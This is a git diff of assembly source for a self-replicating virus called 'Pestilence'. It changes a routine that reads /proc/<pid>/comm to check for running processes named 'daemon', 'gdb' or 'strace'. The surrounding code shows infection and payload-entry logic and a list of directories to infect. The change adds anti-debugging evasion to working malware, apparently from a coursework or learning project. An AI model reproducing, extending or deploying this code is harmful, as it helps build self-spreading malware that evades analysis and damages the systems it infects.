@@ -390,14 +390,15 @@ injectVirus:
 
 
 ; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
-; Read the "/proc/<processID>/stat" file to look for process name *
+; Read the "/proc/<processID>/comm" file to look for process name *
 ; Return an address if process is named "daemon", NULL otherwise  *
 ; RDI => Process ID                                               *
 ; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 isDaemon:
 		push r8
+		push r9
 
-; Concatenate "/proc/", the processID, and the stat filename
+; Concatenate "/proc/", the processID, and the comm filename
 .getFilePath:
 		push rdi
 		lea rsi, [rel processDirectory]
@@ -415,12 +416,12 @@ isDaemon:
 		jnz .copyProcessID
 		lea rsi, [rel processStatFile]
 
-.copyStatFile:
+.copyCommFile:
 		movsb
 		cmp byte [rsi - 1], 0
-		jnz .copyStatFile
+		jnz .copyCommFile
 
-; Open the stat file
+; Open the 'comm' file
 .openFile:
 		mov rax, SYSCALL_OPEN
 		lea rdi, VALUE(s_pestilence.file_path)
@@ -431,23 +432,34 @@ isDaemon:
 		cmp rax, 0
 		jl .return
 
-; Read the file (using the file path as buffer because fuck it)
+; Read the 'comm' file (using the file path as buffer because fuck it)
 .readFile:
 		mov rdi, rax
 		mov rax, SYSCALL_READ
 		lea rsi, VALUE(s_pestilence.file_path)
-		mov rdx, 32
+		mov rdx, DAEMON_NAME_SIZE
 		syscall
 
-; Look at the 32 first bytes of stat file to find name
-.lookForName:
+		lea rdi, [rel daemonName]
+
+; Compare name of process
+.isForbidden:
+		mov r9, rdi
 		lea rdi, VALUE(s_pestilence.file_path)
-		mov rsi, 32
-		lea rdx, [rel daemonName]
-		mov rcx, 8
+		mov rsi, DAEMON_NAME_SIZE
+		mov rdx, r9
+		mov rcx, DAEMON_NAME_SIZE
 		call ft_memmem
 
-; Close "/proc/<processID>/stat"
+.nextForbidden:
+		mov al, 0
+		mov ecx, -1
+		mov rdi, r9
+		repnz scasb
+		cmp byte [rdi], 0
+		jnz .isForbidden
+
+; Close "/proc/<processID>/comm"
 .close:
 		push rax
 		mov rax, SYSCALL_CLOSE
@@ -456,6 +468,7 @@ isDaemon:
 		pop rax
 
 .return:
+		pop r9
 		pop r8
 		ret
 
@@ -595,8 +608,8 @@ data:
 	signature: db "Pestilence v1.0 (c)oded by tblaudez", 0
 	infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
 	processDirectory: db "/proc/", 0
-	processStatFile: db "/stat", 0
-	daemonName: db "(daemon)", 0
+	processStatFile: db "/comm", 0
+	daemonName: db "daemon", 0, "gdb", 0, "strace", 0, 0
 	debugMessage: db "DEBUGGING", 0
 	payloadEntry: dq _start
 	hostEntry: dq die
